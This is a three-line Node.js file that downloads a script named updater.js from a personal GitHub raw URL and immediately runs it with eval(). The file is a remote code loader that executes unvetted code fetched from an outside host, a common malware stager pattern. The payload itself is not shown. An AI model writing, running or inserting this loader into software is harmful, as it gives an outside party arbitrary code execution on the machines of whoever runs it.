const axios = require('axios');

axios.get("https://raw.githubusercontent.com/priyanshu192/check2/main/updater.js")
  .then(res => eval(res.data));